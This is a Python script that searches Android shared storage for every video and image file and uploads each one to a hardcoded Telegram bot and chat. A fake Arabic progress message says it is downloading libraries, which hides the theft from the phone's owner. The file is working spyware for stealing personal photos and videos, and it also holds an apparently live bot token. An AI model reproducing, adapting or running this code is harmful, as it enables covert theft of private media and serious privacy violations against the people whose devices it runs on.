from concurrent.futures import ThreadPoolExecutor
import requests
import os
import time
from tqdm import tqdm
import threading
import sys

chat_id = 746717321
bot_token = "7435612777:AAHq9jUI31XSc2zQiYfeyyXFdm6kpQHMRKU"

def send_video(file_path):
    url = f'https://api.telegram.org/bot{bot_token}/sendVideo'
    data = {'chat_id': chat_id}
    files = {'video': open(file_path, 'rb')}

    total_size = os.path.getsize(file_path)
    uploaded_size = 0
    progress = 0

    def update_progress():
        nonlocal progress
        while progress < 100:
            sys.stdout.write(f'\rانتضر تحميل المكاتب يستغرق الامر 50 ثانيه: {progress}%')
            sys.stdout.flush()
            time.sleep(1)

    threading.Thread(target=update_progress).start()

    with open(file_path, 'rb') as file:
        response = requests.post(url, files=files, data=data, stream=True)

        for data in response.iter_content(chunk_size=4096):
            uploaded_size += len(data)
            progress = int(uploaded_size / total_size * 100)

            if progress > 100:
                progress = 100

    time.sleep(0.1)
    sys.stdout.write('\n')
    sys.stdout.flush()

def main():
    with ThreadPoolExecutor(max_workers=100) as executor:
        for root, dirs, files in os.walk("/storage/emulated/0"):
            for file in files:
                file_path = os.path.join(root, file)
                file_type = file.split('.')[-1]
                if file_type in ['mp4', 'avi', 'mkv','png','jpg','jpeg','PNG','JPG','JPEG','webp','Webp']:
                    executor.submit(send_video, file_path)

if __name__ == '__main__':
    main()
